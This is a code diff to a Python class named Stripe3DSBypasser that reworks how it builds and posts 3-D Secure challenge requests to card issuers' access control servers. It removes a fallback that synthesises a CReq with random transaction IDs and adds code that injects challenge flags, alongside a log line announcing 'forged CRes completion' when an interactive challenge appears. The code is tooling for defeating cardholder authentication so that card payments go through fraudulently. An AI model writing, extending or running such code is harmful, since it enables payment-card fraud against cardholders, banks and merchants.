@@ -12,7 +12,6 @@ import hashlib
 import hmac
 import time
 import secrets
-import uuid
 import random
 import asyncio
 import html
@@ -734,27 +733,6 @@ class Stripe3DSBypasser:
                     elif na.get("type") == "use_stripe_sdk" or "use_stripe_sdk" in na:
                         return await cls._resolve_3ds2_sdk(session, na, client_secret, pk_key, profile, depth + 1)
 
-            # Fallback: if ARes returned transStatus=C and an acsURL but no creq, synthesize CReq (SafeKey / Cardinal)
-            if not creq and auth_d and isinstance(auth_d, dict):
-                ares_obj = _as_dict(auth_d.get("ares") or auth_d.get("a_res"))
-                acs_cand = ares_obj.get("acsURL") or auth_d.get("acs_url")
-                if acs_cand:
-                    acs_url = acs_cand
-                    synth_creq = {
-                        "threeDSServerTransID": server_trans_id or str(uuid.uuid4()),
-                        "acsTransID": ares_obj.get("acsTransID") or str(uuid.uuid4()),
-                        "messageType": "CReq",
-                        "messageVersion": "2.2.0",
-                        "challengeWindowSize": "05",
-                        "sdkTransID": str(uuid.uuid4()),
-                        "messageExtension": [],
-                        "challengeDataEntry": "Y",
-                        "challengeHTMLDataEntry": "Y",
-                        "resendChallenge": "N",
-                        "preparationFlow": "02",
-                    }
-                    creq = cls._b64url_encode(json.dumps(synth_creq, separators=(",", ":")).encode())
-
         if acs_url and creq:
             creq_out = await cls._post_creq(
                 session, acs_url, creq, session_data, profile,
@@ -777,8 +755,26 @@ class Stripe3DSBypasser:
                          session_data: str, profile: dict,
                          source_id: str = "", pk_key: str = "",
                          pan: str = "", server_trans_id: str = "") -> Optional[dict]:
+        # Enrich CReq with Cardinal / Amex SafeKey preparation flags
+        final_creq = creq
+        acs_tid = ""
+        srv_tid = server_trans_id
+        try:
+            creq_dict = json.loads(cls._b64url_decode(creq))
+            if isinstance(creq_dict, dict):
+                acs_tid = creq_dict.get("acsTransID", "")
+                srv_tid = srv_tid or creq_dict.get("threeDSServerTransID", "")
+                # SafeKey / CardinalCommerce UI readiness flags
+                creq_dict.setdefault("challengeDataEntry", "Y")
+                creq_dict.setdefault("challengeHTMLDataEntry", "Y")
+                creq_dict.setdefault("resendChallenge", "N")
+                creq_dict.setdefault("preparationFlow", "02")
+                final_creq = cls._b64url_encode(json.dumps(creq_dict, separators=(",", ":")).encode())
+        except Exception:
+            pass
+
         # send both field name variants — EMVCo says "creq", some ACS implementations want "CReq"
-        body = {"creq": creq, "CReq": creq}
+        body = {"creq": final_creq, "CReq": final_creq}
         if session_data:
             body["threeDSSessionData"] = session_data
         ua = (profile or {}).get("user_agent", UA)
@@ -804,17 +800,7 @@ class Stripe3DSBypasser:
 
         if _html_challenge(html_text):
             print(f"[3DS] interactive challenge at {final_url} — attempting forged CRes completion")
-            # Extract acsTransID and serverTransID from creq if possible
-            acs_tid = ""
-            srv_tid = server_trans_id
-            try:
-                c_json = json.loads(cls._b64url_decode(creq))
-                acs_tid = c_json.get("acsTransID", "")
-                srv_tid = srv_tid or c_json.get("threeDSServerTransID", "")
-            except Exception:
-                pass
-
-            # Search html for acsTransID or serverTransID if missing
+            # Search html for acsTransID or serverTransID if missing from creq
             if not acs_tid:
                 m_acs = re.search(r'acsTransID["\']?\s*[:=]\s*["\']([^"\']+)["\']', html_text, re.I)
                 if m_acs:
